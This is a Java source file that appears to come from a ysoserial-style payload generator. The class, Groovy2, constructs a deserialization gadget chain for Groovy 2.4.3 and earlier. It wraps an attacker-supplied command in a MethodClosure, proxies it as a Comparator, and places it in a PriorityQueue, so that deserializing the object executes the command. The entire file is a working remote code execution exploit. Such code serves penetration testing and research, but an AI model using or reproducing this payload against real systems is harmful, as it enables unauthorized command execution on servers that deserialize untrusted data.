package com.ppp.chain.groovy;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * Source 点 PriorityQueue
 */
@Dependencies({"org.codehaus.groovy:groovy:<=2.4.3"})
@Authors({Authors.Whoopsunix})
@Sink({Sink.Command})
public class Groovy2 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Groovy2.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        String command = sinksHelper.getCommand();

        Object kickOffObject = getChain(command);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "compare");

        // Create Comparator Proxy
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, closure);

        // Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Reflections.setFieldValue(priorityQueue, "queue", new Object[]{null, null});
        Reflections.setFieldValue(priorityQueue, "size", 2);

        return priorityQueue;
    }
}
